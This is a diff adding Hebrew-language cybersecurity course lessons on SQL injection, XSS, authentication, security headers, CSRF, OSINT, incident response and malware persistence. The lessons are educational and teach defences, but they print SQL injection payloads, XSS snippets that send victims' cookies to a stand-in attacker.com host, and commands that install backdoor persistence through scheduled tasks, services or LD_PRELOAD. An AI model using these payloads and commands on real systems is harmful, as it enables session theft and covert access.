@@ -5215,8 +5215,541 @@ iptables -L -n -v --line-numbers</code></pre>
 </div>`
       }
     ]
+  },
+  {
+    id: 110,
+    title: "SQL Injection ו-XSS — מעמיק",
+    pages: [
+      {
+        type: "explanation",
+        title: "SQL Injection — איך זה עובד",
+        content: `<div dir="rtl">
+<h2>SQL Injection — פגיעות מספר 1 ב-Web</h2>
+<p>SQL Injection מתרחשת כשהאפליקציה בונה שאילתת SQL ממחרוזת שמגיעה מהמשתמש, בלי לסנן אותה. התוצאה: תוקף יכול לשנות את לוגיקת השאילתה.</p>
+<h3>דוגמה קלאסית — Login Bypass</h3>
+<div class="code-preview"><pre><code># קוד PHP פגיע
+$query = "SELECT * FROM users WHERE username='" . $_POST['user'] . "' AND password='" . $_POST['pass'] . "'";
+
+# קלט תוקף:
+# username: admin'--
+# password: anything
+
+# שאילתה שנוצרת:
+SELECT * FROM users WHERE username='admin'--' AND password='anything'
+# -- מבטל את שאר השאילתה → מחזיר admin ללא בדיקת סיסמה!</code></pre></div>
+<h3>סוגי SQL Injection</h3>
+<table class="content-table">
+  <tr><th>סוג</th><th>תיאור</th><th>דוגמה</th></tr>
+  <tr><td><strong>Classic/In-band</strong></td><td>תוצאה חוזרת ישירות</td><td>UNION SELECT, Error-based</td></tr>
+  <tr><td><strong>Blind Boolean</strong></td><td>שאלות כן/לא — אין error</td><td><code>AND 1=1</code> vs <code>AND 1=2</code></td></tr>
+  <tr><td><strong>Time-based Blind</strong></td><td>מדידת זמן תגובה</td><td><code>AND SLEEP(5)</code></td></tr>
+  <tr><td><strong>Out-of-band</strong></td><td>נתונים לשרת חיצוני</td><td>DNS exfiltration</td></tr>
+</table>
+<h3>UNION-based Extraction</h3>
+<div class="code-preview"><pre><code># שלב 1: גלה כמה עמודות יש
+' ORDER BY 1-- → ok
+' ORDER BY 2-- → ok
+' ORDER BY 3-- → error → 2 עמודות
+
+# שלב 2: גלה עמודות שמוצגות
+' UNION SELECT NULL,NULL--
+' UNION SELECT 'a',NULL--  → אם 'a' מוצג → עמודה 1 visible
+
+# שלב 3: שלוף נתונים
+' UNION SELECT username,password FROM users--
+
+# שלב 4: גלה database schema
+' UNION SELECT table_name,NULL FROM information_schema.tables--</code></pre></div>
+<h3>מניעה — Prepared Statements</h3>
+<div class="code-preview"><pre><code># Python - SQLite (פגיע)
+cursor.execute(f"SELECT * FROM users WHERE name='{user_input}'")
+
+# Python - SQLite (בטוח)
+cursor.execute("SELECT * FROM users WHERE name=?", (user_input,))
+
+# Java PreparedStatement
+PreparedStatement ps = conn.prepareStatement(
+    "SELECT * FROM users WHERE name=? AND pass=?"
+);
+ps.setString(1, username);
+ps.setString(2, password);</code></pre></div>
+<p>Prepared Statements עובדים כי השאילתה מקומפלת לפני הכנסת הנתונים — הנתונים לא יכולים לשנות את מבנה השאילתה.</p>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "XSS — Cross-Site Scripting",
+        content: `<div dir="rtl">
+<h2>XSS — הזרקת JavaScript לדפדפן הקורבן</h2>
+<p>XSS מאפשרת לתוקף להריץ JavaScript בהקשר של האתר המותקף — בדפדפן של קורבן אחר. זה שונה מ-SQLi: היעד הוא הדפדפן, לא מסד הנתונים.</p>
+<h3>3 סוגי XSS</h3>
+<table class="content-table">
+  <tr><th>סוג</th><th>מאפיין</th><th>כיצד עובד</th></tr>
+  <tr><td><strong>Reflected</strong></td><td>לא נשמר</td><td>Payload ב-URL → חוזר ישירות ב-response</td></tr>
+  <tr><td><strong>Stored/Persistent</strong></td><td>נשמר ב-DB</td><td>Payload נשמר → רץ על כל visitor</td></tr>
+  <tr><td><strong>DOM-based</strong></td><td>ב-JavaScript</td><td>Payload ב-fragment/location → DOM manipulation</td></tr>
+</table>
+<h3>Payload קלאסי — Cookie Theft</h3>
+<div class="code-preview"><pre><code"># Reflected XSS — ב-URL
+https://site.com/search?q=<script>document.location='http://attacker.com/?c='+document.cookie</script>
+
+# Stored XSS — בשדה תגובה
+<script>
+  fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
+</script>
+
+# Event handler bypass (כשסינון מסיר script tags)
+<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
+<svg onload="alert(document.domain)">
+<body onpageshow="alert(1)"></code></pre></div>
+<h3>מניעה</h3>
+<div class="code-preview"><pre><code># 1. HTML Encoding — מניע Reflected/Stored XSS
+# במקום להציג: <script>
+# מציגים:       &lt;script&gt;
+
+# Python (Jinja2 — escape אוטומטי)
+{{ user_input }}   # בטוח — escaped
+{{ user_input | safe }}  # מסוכן — אל תשתמש!
+
+# 2. Content Security Policy Header
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
+
+# 3. HttpOnly Cookie — מונע גישת JS ל-cookie
+Set-Cookie: session=xyz; HttpOnly; Secure; SameSite=Strict</code></pre></div>
+</div>`
+      },
+      {
+        type: "questions",
+        title: "שאלות — SQLi ו-XSS",
+        questions: [
+          { q: "מה ההבדל בין SQL Injection ל-XSS?", a: "SQLi תוקפת את מסד הנתונים בצד השרת. XSS תוקפת את הדפדפן של משתמש אחר — מריצה JS בהקשר של האתר. SQLi = server-side. XSS = client-side." },
+          { q: "מה Prepared Statements ולמה הם פותרים SQLi?", a: "Prepared Statements מקמפלים את שאילתת ה-SQL לפני הכנסת הנתונים. הנתונים מוכנסים כפרמטרים, לא כטקסט — כך הם לא יכולים לשנות את מבנה השאילתה." },
+          { q: "למה HttpOnly cookie מגן מ-XSS?", a: "HttpOnly Cookie לא נגיש ל-JavaScript (document.cookie מחזיר ריק). גם אם יש XSS, התוקף לא יכול לגנוב את ה-session cookie." },
+          { q: "מה Time-based Blind SQLi?", a: "כאשר אין output גלוי מהשאילתה, ניתן לשלוח SLEEP(5) — אם השרת מגיב אחרי 5 שניות, הקוד רץ. כך אפשר לחלץ נתונים ביט-ביט לפי זמני תגובה." }
+        ]
+      }
+    ]
+  },
+  {
+    id: 111,
+    title: "Authentication & Authorization",
+    pages: [
+      {
+        type: "explanation",
+        title: "Authentication vs Authorization",
+        content: `<div dir="rtl">
+<h2>Authentication vs Authorization</h2>
+<p>שני מושגים יסודיים שמתבלבלים לעתים קרובות:</p>
+<table class="content-table">
+  <tr><th>מושג</th><th>שאלה</th><th>דוגמה</th></tr>
+  <tr><td><strong>Authentication (AuthN)</strong></td><td>מי אתה?</td><td>Login עם username+password</td></tr>
+  <tr><td><strong>Authorization (AuthZ)</strong></td><td>מה מותר לך?</td><td>רק admin יכול למחוק משתמשים</td></tr>
+  <tr><td><strong>MFA</strong></td><td>הוכח עוד פעם</td><td>SMS OTP, TOTP, hardware key</td></tr>
+</table>
+<h3>שיטות Authentication</h3>
+<table class="content-table">
+  <tr><th>שיטה</th><th>יתרון</th><th>חיסרון</th></tr>
+  <tr><td>Password</td><td>פשוט</td><td>ניתן לגניבה, brute-force</td></tr>
+  <tr><td>TOTP (Google Auth)</td><td>OTP מתחלף</td><td>מחייב מכשיר</td></tr>
+  <tr><td>WebAuthn/FIDO2</td><td>Phishing-resistant</td><td>מחייב hardware key/biometric</td></tr>
+  <tr><td>OAuth 2.0 / OIDC</td><td>SSO, לא שומר סיסמאות</td><td>מורכב</td></tr>
+  <tr><td>Certificate (mTLS)</td><td>חזק מאוד</td><td>ניהול certificates</td></tr>
+</table>
+<h3>JWT — JSON Web Tokens</h3>
+<div class="code-preview"><pre><code># מבנה JWT: header.payload.signature
+eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xyz
+
+# Header (base64):
+{"alg": "HS256", "typ": "JWT"}
+
+# Payload (base64):
+{"user": "admin", "role": "user", "exp": 1700000000}
+
+# Signature:
+HMACSHA256(base64url(header) + "." + base64url(payload), secret)
+
+# פגיעות: alg=none attack
+# header שונה ל: {"alg": "none"}
+# signature מוסר — שרת פגיע מקבל כל payload!
+# תמיד לאמת: whitelist של algorithms (לא "none")</code></pre></div>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "סיסמאות — Hashing נכון",
+        content: `<div dir="rtl">
+<h2>איך לאחסן סיסמאות בצורה בטוחה</h2>
+<p>לעולם אל תאחסן סיסמאות בטקסט גלוי! גם hash רגיל (MD5, SHA1) לא מספיק — rainbow tables ו-GPU cracking פוצחות אותם בשניות.</p>
+<h3>Password Hashing Functions</h3>
+<table class="content-table">
+  <tr><th>אלגוריתם</th><th>מה מוסיף</th><th>מומלץ?</th></tr>
+  <tr><td>MD5 / SHA1 / SHA256</td><td>כלום — מהיר מדי</td><td>❌ לא לסיסמאות</td></tr>
+  <tr><td><strong>bcrypt</strong></td><td>work factor (cost), salt built-in</td><td>✅ כן</td></tr>
+  <tr><td><strong>Argon2id</strong></td><td>memory-hard, time + memory cost</td><td>✅✅ הכי מומלץ</td></tr>
+  <tr><td><strong>scrypt</strong></td><td>memory-hard</td><td>✅ כן</td></tr>
+</table>
+<div class="code-preview"><pre><code># Python — bcrypt
+import bcrypt
+# Hash סיסמה
+hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
+
+# אימות
+if bcrypt.checkpw(password.encode(), hashed):
+    print("Valid!")
+
+# Python — Argon2 (הכי מומלץ)
+from argon2 import PasswordHasher
+ph = PasswordHasher(time_cost=2, memory_cost=65536, parallelism=2)
+hash = ph.hash(password)
+ph.verify(hash, password)  # מחזיר True/False</code></pre></div>
+<h3>Salt — מה זה ולמה חשוב</h3>
+<p>Salt הוא ערך אקראי שמוסיפים לסיסמה לפני ה-hash. כך שתי סיסמאות זהות מקבלות hash שונה — rainbow tables לא עובדות. bcrypt ו-Argon2 עושים זאת אוטומטית.</p>
+</div>`
+      },
+      {
+        type: "questions",
+        title: "שאלות — Auth",
+        questions: [
+          { q: "מה ההבדל בין Authentication ל-Authorization?", a: "Authentication = זיהוי (מי אתה?). Authorization = הרשאות (מה מותר לך?). Login הוא AuthN. בדיקת permission להגיע לעמוד admin הוא AuthZ." },
+          { q: "למה bcrypt עדיף על SHA256 לסיסמאות?", a: "bcrypt מכיל work factor מכוון שהופך אותו לאיטי — brute-force לוקח הרבה יותר זמן. גם salt מובנה. SHA256 מהיר מדי — GPU יכול לנסות מיליארדי ניחושים בשנייה." },
+          { q: "מה JWT alg=none attack?", a: "JWT קובע את אלגוריתם החתימה ב-header. שרת פגיע שמקבל alg=none מאמת טוקן ללא חתימה כלל — תוקף יכול לזייף כל payload (למשל role=admin)." }
+        ]
+      }
+    ]
+  },
+  {
+    id: 112,
+    title: "Web Security Headers",
+    pages: [
+      {
+        type: "explanation",
+        title: "HTTP Security Headers — שכבת הגנה קלה",
+        content: `<div dir="rtl">
+<h2>Security Headers — ההגנה הנסתרת</h2>
+<p>HTTP response headers יכולים להנחות את הדפדפן לאכוף מדיניות אבטחה. בלחיצה על כמה שורות קונפיגורציה, ניתן לחסום קטגוריות שלמות של מתקפות.</p>
+<h3>Headers חשובים</h3>
+<table class="content-table">
+  <tr><th>Header</th><th>מה עושה</th><th>ערך מומלץ</th></tr>
+  <tr><td><strong>Content-Security-Policy</strong></td><td>מגביל מקורות JS, CSS, תמונות</td><td><code>default-src 'self'</code></td></tr>
+  <tr><td><strong>Strict-Transport-Security</strong></td><td>כופה HTTPS (HSTS)</td><td><code>max-age=31536000; includeSubDomains</code></td></tr>
+  <tr><td><strong>X-Frame-Options</strong></td><td>מונע Clickjacking (iframes)</td><td><code>DENY</code> או <code>SAMEORIGIN</code></td></tr>
+  <tr><td><strong>X-Content-Type-Options</strong></td><td>מונע MIME sniffing</td><td><code>nosniff</code></td></tr>
+  <tr><td><strong>Referrer-Policy</strong></td><td>מגביל דליפת URL ב-Referer</td><td><code>strict-origin-when-cross-origin</code></td></tr>
+  <tr><td><strong>Permissions-Policy</strong></td><td>מגביל APIs (מיקום, מצלמה)</td><td><code>geolocation=(), camera=()</code></td></tr>
+</table>
+<h3>Content Security Policy — דוגמאות</h3>
+<div class="code-preview"><pre><code># בסיסי — רק מ-origin שלך
+Content-Security-Policy: default-src 'self'
+
+# עם CDN ו-Google Fonts
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' https://cdn.jsdelivr.net;
+  style-src 'self' https://fonts.googleapis.com;
+  font-src 'self' https://fonts.gstatic.com;
+  img-src 'self' data: https:;
+  frame-ancestors 'none'
+
+# Report-only mode — לא חוסם, רק מדווח
+Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report</code></pre></div>
+<h3>HSTS — HTTP Strict Transport Security</h3>
+<p>HSTS אומר לדפדפן: לעולם אל תתחבר ל-HTTP — תמיד HTTPS. הדפדפן שומר את זה לזמן ה-max-age. preload משמש להכנסה ל-HSTS preload list של הדפדפן.</p>
+<div class="code-preview"><pre><code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</code></pre></div>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "CSRF — Cross-Site Request Forgery",
+        content: `<div dir="rtl">
+<h2>CSRF — גרימת בקשות ממקור זדוני</h2>
+<p>CSRF מנצלת את העובדה שהדפדפן שולח cookies אוטומטית עם כל בקשה. אתר זדוני יכול לגרום לדפדפן של הקורבן לשלוח בקשה לאתר שבו הוא מחובר.</p>
+<div class="code-preview"><pre><code"># תרחיש:
+# 1. Alice מחוברת ל-bank.com (cookie session בדפדפן)
+# 2. Alice ביקרה ב-evil.com
+# 3. evil.com מכיל:
+<img src="https://bank.com/transfer?to=attacker&amount=1000">
+# הדפדפן שולח את ה-cookie של bank.com אוטומטית!
+
+# פתרון: CSRF Token
+# שרת מייצר token אקראי בכל form → שולח ב-hidden field
+# בקשה ללא token תקני → נדחית
+
+# Flask-WTF דוגמה:
+<form method="POST">
+  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+  ...
+</form>
+
+# פתרון מודרני: SameSite Cookie
+Set-Cookie: session=xyz; SameSite=Strict; Secure; HttpOnly
+# SameSite=Strict → Cookie לא נשלח בבקשות cross-site בכלל
+# SameSite=Lax → Cookie נשלח רק ב-navigation (לא POST)</code></pre></div>
+</div>`
+      },
+      {
+        type: "questions",
+        title: "שאלות — Web Security Headers",
+        questions: [
+          { q: "מה Content-Security-Policy עושה?", a: "CSP מנחה את הדפדפן מאילו מקורות מותר לטעון JS, CSS, תמונות וכו'. מגביל XSS בכך שחוסם הרצת inline JS ו-JS ממקורות לא מורשים." },
+          { q: "מה CSRF ואיך SameSite Cookie פותר אותו?", a: "CSRF גורם לדפדפן לשלוח בקשה לאתר X בזמן שהמשתמש נמצא ב-evil.com, עם cookies של X. SameSite=Strict מונע שליחת ה-cookie בבקשות cross-site — כך הבקשה הזדונית תישלח ללא session." },
+          { q: "מה HSTS ולמה הוא מגן מ-SSL Stripping?", a: "HSTS אומר לדפדפן לתמיד להשתמש ב-HTTPS לדומיין זה. SSL Stripping תוקפת ע\"י downgrade ל-HTTP. עם HSTS, הדפדפן מסרב לחיבור HTTP — כך המתקפה נכשלת." }
+        ]
+      }
+    ]
+  },
+  {
+    id: 113,
+    title: "Threat Intelligence ו-OSINT",
+    pages: [
+      {
+        type: "explanation",
+        title: "Threat Intelligence — מה זה?",
+        content: `<div dir="rtl">
+<h2>Threat Intelligence — מידע על איומים</h2>
+<p>Threat Intelligence (TI) הוא מידע על תוקפים, שיטות תקיפה, ו-IoCs (Indicators of Compromise). מאפשר לארגון לעבור ממגיב פסיבי למוביל פרואקטיבי.</p>
+<h3>סוגי Threat Intelligence</h3>
+<table class="content-table">
+  <tr><th>סוג</th><th>מקורות</th><th>קהל יעד</th></tr>
+  <tr><td><strong>Strategic</strong></td><td>דוחות, מגמות עולמיות</td><td>CISO, Management</td></tr>
+  <tr><td><strong>Operational</strong></td><td>Campaign analysis, TTPs</td><td>Security managers</td></tr>
+  <tr><td><strong>Tactical</strong></td><td>IoCs: IP, hash, domain</td><td>SOC analysts</td></tr>
+  <tr><td><strong>Technical</strong></td><td>Malware samples, exploits</td><td>Threat hunters</td></tr>
+</table>
+<h3>IoC — Indicators of Compromise</h3>
+<p>IoCs הם עדויות שמכשיר/רשת נפרצה:</p>
+<ul>
+<li><strong>IP addresses</strong> — כתובות שרתי C2 (Command & Control)</li>
+<li><strong>File hashes</strong> — MD5/SHA256 של malware מוכר</li>
+<li><strong>Domains</strong> — דומיינים זדוניים (phishing, C2)</li>
+<li><strong>URLs</strong> — כתובות של payload delivery</li>
+<li><strong>Registry keys</strong> — persistence mechanisms ב-Windows</li>
+<li><strong>Mutexes</strong> — malware בודק אם כבר מותקן</li>
+</ul>
+<h3>מסגרת MITRE ATT&CK</h3>
+<p>מסגרת פתוחה עם TTPs (Tactics, Techniques, Procedures) של APTs. 14 Tactics: Reconnaissance → Initial Access → Execution → Persistence → ... → Exfiltration → Impact.</p>
+<div class="code-preview"><pre><code># דוגמת TTP: T1566.001 — Spearphishing Attachment
+# Tactic: Initial Access
+# Technique: Phishing → Spearphishing Attachment
+# Procedure: APT29 שולח PDF זדוני ל-targets ממוקדים
+# Mitigation: M1049 — Antivirus/Antimalware, הכשרת עובדים</code></pre></div>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "OSINT — Open Source Intelligence",
+        content: `<div dir="rtl">
+<h2>OSINT — מודיעין ממקורות פתוחים</h2>
+<p>OSINT הוא איסוף מידע ממקורות ציבוריים. משמש לאנשי Red Team לסיוע ב-Reconnaissance, ולאנשי Blue Team להבין מה תוקפים יכולים לגלות על ארגונם.</p>
+<h3>כלים ומקורות OSINT</h3>
+<table class="content-table">
+  <tr><th>כלי</th><th>מה מוצא</th></tr>
+  <tr><td><strong>Shodan</strong></td><td>מכשירי IoT, שרתים חשופים לאינטרנט עם ports פתוחים</td></tr>
+  <tr><td><strong>Censys</strong></td><td>סריקה של כל ה-IPv4 — certificates, banners, services</td></tr>
+  <tr><td><strong>theHarvester</strong></td><td>emails, subdomains, IPs ממנועי חיפוש</td></tr>
+  <tr><td><strong>Maltego</strong></td><td>גרף קשרים בין domains, IPs, organizations</td></tr>
+  <tr><td><strong>WHOIS / DNS</strong></td><td>רישום דומיין, nameservers, MX records</td></tr>
+  <tr><td><strong>Google Dorks</strong></td><td>site:, filetype:, inurl: לאיתור מידע רגיש</td></tr>
+  <tr><td><strong>Have I Been Pwned</strong></td><td>האם email נחשף ב-data breach</td></tr>
+</table>
+<div class="code-preview"><pre><code># Google Dorks — דוגמאות
+site:target.com filetype:pdf              # קבצי PDF
+site:target.com inurl:admin               # ממשקי ניהול
+site:target.com intext:"password"         # קבצים עם "password"
+"@target.com" site:linkedin.com           # עובדים ב-LinkedIn
+
+# theHarvester
+theHarvester -d target.com -b google,bing,linkedin -l 100
+
+# Shodan דוגמה
+hostname:target.com port:22               # SSH חשוף
+org:"Target Company" product:"Apache"     # Apache servers</code></pre></div>
+<h3>Passive vs Active Reconnaissance</h3>
+<p><strong>Passive:</strong> לא שולחים traffic ל-target — WHOIS, Shodan, Google. <strong>Active:</strong> שולחים requests ישירות — nmap, ping sweep. Active Recon עלולה להיות בלתי חוקית ללא אישור!</p>
+</div>`
+      },
+      {
+        type: "questions",
+        title: "שאלות — TI ו-OSINT",
+        questions: [
+          { q: "מה IoC ותן 3 דוגמאות?", a: "IoC = Indicator of Compromise — עדות לפריצה. דוגמאות: IP address של שרת C2, hash של malware file, domain זדוני של phishing site." },
+          { q: "מה MITRE ATT&CK?", a: "מסגרת פתוחה עם 14 Tactics (שלבי מתקפה) ומאות Techniques. מאפשרת לסווג TTPs של APTs ולמפות מנגנוני הגנה. משמשת ל-Red Team planning ו-Blue Team detection engineering." },
+          { q: "מה ההבדל בין Passive ל-Active Reconnaissance?", a: "Passive Recon: איסוף מידע ממקורות ציבוריים (Shodan, WHOIS, Google) — אין traffic ישיר ל-target, לא ניתן לזהות. Active Recon: שליחת requests ישירות (nmap, ping) — ניתן לזהות, ועלול להיות בלתי חוקי ללא אישור." }
+        ]
+      }
+    ]
+  },
+  {
+    id: 114,
+    title: "Incident Response — תגובה לאירועים",
+    pages: [
+      {
+        type: "explanation",
+        title: "מחזור החיים של Incident Response",
+        content: `<div dir="rtl">
+<h2>Incident Response (IR) — 6 שלבים</h2>
+<p>IR הוא תהליך מסודר לזיהוי, בלימה, וסגירת אירועי אבטחה. NIST SP 800-61 מגדיר 4 שלבים; בפועל משתמשים לרוב ב-6:</p>
+<table class="content-table">
+  <tr><th>שלב</th><th>פעולות</th></tr>
+  <tr><td><strong>1. Preparation</strong></td><td>בניית IR team, כלים, runbooks, תרגולים</td></tr>
+  <tr><td><strong>2. Identification</strong></td><td>זיהוי האירוע — alert מ-SIEM, EDR, user report</td></tr>
+  <tr><td><strong>3. Containment</strong></td><td>בידוד מכשיר נגוע, חסימת IP, ניתוק מהרשת</td></tr>
+  <tr><td><strong>4. Eradication</strong></td><td>הסרת malware, patch, reset credentials</td></tr>
+  <tr><td><strong>5. Recovery</strong></td><td>שחזור שירותים, monitoring מוגבר</td></tr>
+  <tr><td><strong>6. Lessons Learned</strong></td><td>Post-mortem, עדכון כלים ו-runbooks</td></tr>
+</table>
+<h3>כלי Forensics נפוצים</h3>
+<div class="code-preview"><pre><code># Volatility — Memory Forensics
+volatility -f memory.dmp --profile=Win10x64 pslist    # רשימת תהליכים
+volatility -f memory.dmp --profile=Win10x64 netscan   # חיבורי רשת
+volatility -f memory.dmp --profile=Win10x64 malfind   # תהליכים חשודים
+
+# Linux — Incident Response commands
+netstat -tulnp                  # פורטים פתוחים + תהליכים
+ss -tulnp                       # modern netstat
+ps auxf                         # עץ תהליכים
+last -n 20                      # 20 logins אחרונים
+cat /etc/crontab                # persistence ב-cron
+find /tmp -newer /etc/passwd    # קבצים חדשים ב-/tmp
+
+# Windows PowerShell
+Get-Process | Sort CPU -Desc    # תהליכים לפי CPU
+Get-NetTCPConnection            # חיבורים פעילים
+Get-ScheduledTask | Where-Object State -eq 'Ready'  # scheduled tasks</code></pre></div>
+</div>`
+      },
+      {
+        type: "story",
+        title: "אירוע אמיתי — SolarWinds 2020",
+        content: `<div dir="rtl">
+<h2>SolarWinds — Supply Chain Attack</h2>
+<p>דצמבר 2020: FireEye גילתה שתוקפים (APT29 / Cozy Bear) חדרו לתוכנת ה-IT management Orion של SolarWinds — וה-update הרגיל הפך לנשק.</p>
+<h3>שרשרת ההתקפה</h3>
+<ol>
+<li>תוקפים חדרו לסביבת הפיתוח של SolarWinds (SUNBURST)</li>
+<li>הזריקו backdoor ל-Orion DLL — SUNBURST malware</li>
+<li>SolarWinds שחררה update חתומה — 18,000 לקוחות התקינו</li>
+<li>SUNBURST "ישן" 2 שבועות לפני הפעלה — נמנע מ-sandbox detection</li>
+<li>C2 תקשורת דרך DNS — נראתה כ-legitimate traffic</li>
+<li>לקוחות כולל FireEye, Microsoft, US Treasury, DoD — נפגעו</li>
+</ol>
+<h3>לקחים</h3>
+<ul>
+<li><strong>Software Supply Chain</strong> — ה-update הרגיל הוא וקטור תקיפה</li>
+<li><strong>Code Signing</strong> — חתימה לא מספיקה אם CI/CD נפרץ</li>
+<li><strong>Zero Trust</strong> — גם software "מאמין" צריך לפעול עם minimal privilege</li>
+<li><strong>Network segmentation</strong> — מנעה ממנה לנוע laterally</li>
+<li>גורם ייחוס: ממשלת ארה"ב — רוסיה (SVR)</li>
+</ul>
+</div>`
+      },
+      {
+        type: "questions",
+        title: "שאלות — Incident Response",
+        questions: [
+          { q: "מה 6 שלבי Incident Response?", a: "Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned. שלב ה-Containment קריטי — צמצום נזק מיידי. Lessons Learned — מונע הישנות." },
+          { q: "מה Supply Chain Attack? תן דוגמה.", a: "תקיפת שרשרת אספקה — פרצה לתוכנה של ספק שאתה סומך עליה. SolarWinds: תוקפים הזריקו malware ל-update חתום של Orion → 18,000 ארגונים התקינו וולונטרית." },
+          { q: "מה volatility ולמה משתמשים בו ב-IR?", a: "Volatility היא framework לניתוח memory dumps. ב-IR משתמשים בה לזיהוי תהליכים זדוניים, חיבורי רשת בזמן הפריצה, והסתרת תהליכים (process injection) — מידע שלא נשמר בדיסק." }
+        ]
+      }
+    ]
+  },
+  {
+    id: 115,
+    title: "Malware Analysis — מבוא",
+    pages: [
+      {
+        type: "explanation",
+        title: "סוגי Malware",
+        content: `<div dir="rtl">
+<h2>Malware — סוגים ומאפיינים</h2>
+<table class="content-table">
+  <tr><th>סוג</th><th>תיאור</th><th>דוגמה מפורסמת</th></tr>
+  <tr><td><strong>Virus</strong></td><td>מדביק קבצים, מתפשט בעצמו</td><td>CIH, Melissa</td></tr>
+  <tr><td><strong>Worm</strong></td><td>מתפשט ברשת ללא קובץ host</td><td>WannaCry, Slammer</td></tr>
+  <tr><td><strong>Trojan</strong></td><td>מסווה עצמו כ-software לגיטימי</td><td>Emotet, ZeuS</td></tr>
+  <tr><td><strong>Ransomware</strong></td><td>מצפין קבצים, דורש כופר</td><td>LockBit, REvil</td></tr>
+  <tr><td><strong>Rootkit</strong></td><td>מסתיר עצמו ב-OS kernel</td><td>TDSS, Necurs</td></tr>
+  <tr><td><strong>Spyware</strong></td><td>גנב מידע שקט</td><td>Pegasus, FinFisher</td></tr>
+  <tr><td><strong>RAT</strong></td><td>Remote Access Trojan — שליטה מלאה</td><td>Cobalt Strike, NjRAT</td></tr>
+  <tr><td><strong>Botnet</strong></td><td>רשת מכשירים נגועים</td><td>Mirai, Conficker</td></tr>
+</table>
+<h3>Static vs Dynamic Analysis</h3>
+<table class="content-table">
+  <tr><th>שיטה</th><th>מה בודקים</th><th>כלים</th></tr>
+  <tr><td><strong>Static</strong></td><td>הקובץ עצמו — strings, imports, headers</td><td>Ghidra, IDA Pro, strings, PEStudio</td></tr>
+  <tr><td><strong>Dynamic</strong></td><td>התנהגות בזמן ריצה — API calls, network</td><td>Cuckoo Sandbox, Process Monitor</td></tr>
+</table>
+<div class="code-preview"><pre><code># Static Analysis — Linux
+file malware.exe                    # סוג הקובץ
+strings malware.exe | head -50      # strings קריאים
+md5sum malware.exe                  # hash לבדיקה ב-VirusTotal
+objdump -d malware.exe | head -100  # disassembly
+
+# Dynamic Analysis (ב-isolated VM!)
+# Process Monitor — מעקב אחרי filesystem/registry changes
+# Wireshark — לכוד traffic C2
+# API Monitor — ראה API calls כמו CreateFile, RegSetValue
+
+# VirusTotal — בדיקה אונליין
+# curl -X POST 'https://www.virustotal.com/vtapi/v2/file/scan' \
+#  -F 'apikey=<key>' -F 'file=@malware.exe'</code></pre></div>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "Persistence Mechanisms",
+        content: `<div dir="rtl">
+<h2>Persistence — איך Malware שורד Reboot</h2>
+<p>Malware מחפש דרך לרוץ גם אחרי reboot. הכרת מנגנוני Persistence חיונית לאנשי IR לאיתור ונקיון.</p>
+<h3>Windows Persistence</h3>
+<div class="code-preview"><pre><code"># Registry Run Keys (הנפוצות ביותר)
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+# Malware מוסיף value → רץ עם כל login
+
+# Scheduled Tasks
+schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onlogon
+
+# Services
+sc create "WinHelper" binpath= "C:\malware.exe" start= auto
+
+# DLL Hijacking
+# תהליך לגיטימי טוען DLL מנתיב ניתן לכתיבה → malware DLL שם
+
+# Startup Folder
+C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</code></pre></div>
+<h3>Linux Persistence</h3>
+<div class="code-preview"><pre><code"># Cron jobs
+crontab -l              # של המשתמש הנוכחי
+cat /etc/crontab        # System-wide
+ls /etc/cron.d/         # Drop-in cron files
+
+# Systemd service
+cat /etc/systemd/system/backdoor.service
+# [Service]
+# ExecStart=/tmp/.hidden/backdoor
+# Restart=always
+
+# SSH Authorized Keys
+cat ~/.ssh/authorized_keys  # Public keys שיכולות להתחבר ללא סיסמה
+
+# LD_PRELOAD Hijacking
+echo "LD_PRELOAD=/tmp/malicious.so" >> /etc/environment</code></pre></div>
+<p>כשמנקים malware, חייבים לבדוק את כל מנגנוני ה-Persistence — אחרת הוא חוזר אחרי reboot.</p>
+</div>`
+      },
+      {
+        type: "questions",
+        title: "שאלות — Malware Analysis",
+        questions: [
+          { q: "מה ההבדל בין Static ל-Dynamic Analysis?", a: "Static: בוחנים את הקובץ עצמו ללא הרצה — strings, imports, code. Dynamic: מריצים ב-sandbox ובוחנים התנהגות — API calls, network traffic, file changes. Dynamic מגלה obfuscated code שStatic מחמיץ." },
+          { q: "מה Persistence ולמה זה חשוב ל-IR?", a: "Persistence = מנגנון שמאפשר ל-malware לרוץ אחרי reboot. ב-IR חייבים לנקות את כל מנגנוני ה-Persistence — Registry Run Keys, Scheduled Tasks, Services, Cron — לפני שחזור המערכת." },
+          { q: "מה Ransomware וכיצד ניתן למנוע אותו?", a: "Ransomware מצפין קבצים ודורש כופר לפענוח. מניעה: 1) Backups מנותקים (offline/immutable), 2) Patch management, 3) Email filtering, 4) Endpoint protection, 5) Network segmentation למנוע lateral movement." }
+        ]
+      }
+    ]
   }
-]
+  ]
   },
   {
     id: 'devops',
